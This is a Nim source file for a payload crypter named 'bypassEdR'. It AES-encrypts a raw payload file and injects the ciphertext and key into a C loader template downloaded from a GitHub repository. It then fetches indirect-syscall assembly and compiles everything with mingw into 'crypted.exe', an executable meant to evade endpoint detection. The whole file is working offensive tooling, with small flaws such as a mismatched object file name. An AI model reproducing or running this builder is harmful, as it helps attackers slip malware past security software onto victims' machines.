import os, strutils, httpclient, osproc, sequtils, random
import nimcrypto/aes, nimcrypto/modes, nimcrypto/padding

proc AESencrypt(content: seq[byte], key: seq[byte]): (seq[byte], seq[byte]) =
  ## Encrypts the provided content using AES-CBC mode with PKCS#7 padding.
  ## Uses an IV of all zeros. For better security, consider using a random IV.
  let iv = newSeq[byte](16)  # 16-byte IV (all zeros)
  let paddedContent = pkcs7Pad(content, 16)
  let ciphertext = aesCBCEncrypt(key, iv, paddedContent)
  return (ciphertext, key)

proc bypassEdR() =
  ## Specify the payload file name.
  let payloadName = "payload.bin"
  
  ## Read the payload file in binary mode.
  var fileContent: string
  try:
    fileContent = readFile(payloadName, fmBinary)
  except OSError:
    echo "Error: Cannot open file ", payloadName
    quit(1)
  
  ## Convert file content into a sequence of bytes.
  let content = toSeq(fileContent)
  
  ## Generate a random 16-byte key.
  var KEY = newSeq[byte](16)
  for i in 0..<16:
    KEY[i] = byte(rand(0, 255))
  
  ## Encrypt the content using AES.
  let (ciphertext, keyOut) = AESencrypt(content, KEY)
  
  ## Convert the ciphertext and key into C-style hexadecimal string arrays.
  let ciphertextStr = ciphertext.mapIt("0x" & it.format("02x")).join(", ")
  let keyStr = KEY.mapIt("0x" & it.format("02x")).join(", ")
  let aeskey = "unsigned char AESkey[] = { " & keyStr & " };"
  let aescode = "unsigned char cool[] = { " & ciphertextStr & " };"
  
  ## URLs for downloading required files.
  let url = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/indirect.c"
  let url2 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.asm"
  let url3 = "https://raw.githubusercontent.com/dagowda/dhanush_intro/refs/heads/main/dummyda/indirect/syscalls.h"
  
  ## Download and modify the C source file.
  try:
    var client = newHttpClient()
    let content1 = client.get(url)
    var modifiedContent1 = content1.replace("unsigned char AESkey[] = {};", aeskey)
    modifiedContent1 = modifiedContent1.replace("unsigned char cool[] = {};", aescode)
    writeFile("indirect.c", modifiedContent1)
  except HttpRequestError as e:
    echo "Error: ", e.msg
    quit(1)
  
  ## Download syscalls.asm.
  try:
    var client2 = newHttpClient()
    let asmContent = client2.get(url2)
    writeFile("syscalls.asm", asmContent)
  except HttpRequestError as e:
    echo "Error: ", e.msg
    quit(1)
  
  ## Download syscalls.h.
  try:
    var client3 = newHttpClient()
    let hContent = client3.get(url3)
    writeFile("syscalls.h", hContent)
  except HttpRequestError as e:
    echo "Error: ", e.msg
    quit(1)
  
  ## Run external processes to compile and link the payload.
  try:
    var proc1 = startProcess("uasm", args = @["-win64", "syscalls.asm", "-Fo=syscalls.obj"], options = {poUsePath})
    let res1 = waitForExit(proc1)
    if res1 != 0:
      raise newException(OSError, "uasm failed")
  
    var proc2 = startProcess("x86_64-w64-mingw32-gcc", args = @["-c", "indirect.c", "-o", "file.obj"], options = {poUsePath})
    let res2 = waitForExit(proc2)
    if res2 != 0:
      raise newException(OSError, "gcc compilation failed for indirect.c")
  
    var proc3 = startProcess("x86_64-w64-mingw32-gcc", args = @["file.obj", "syscalls.o", "-o", "crypted.exe"], options = {poUsePath})
    let res3 = waitForExit(proc3)
    if res3 != 0:
      raise newException(OSError, "gcc linking failed")
  
    echo "[*] Payload successfully created as crypted.exe"
  except OSError as e:
    echo "Error: ", e.msg
  
  ## Clean up temporary files.
  for file in @["syscalls.asm", "indirect.c", "syscalls.h", "syscalls.o", "file.obj"]:
    try:
      removeFile(file)
    except OSError:
      echo "Warning: Could not remove file ", file

when isMainModule:
  bypassEdR()
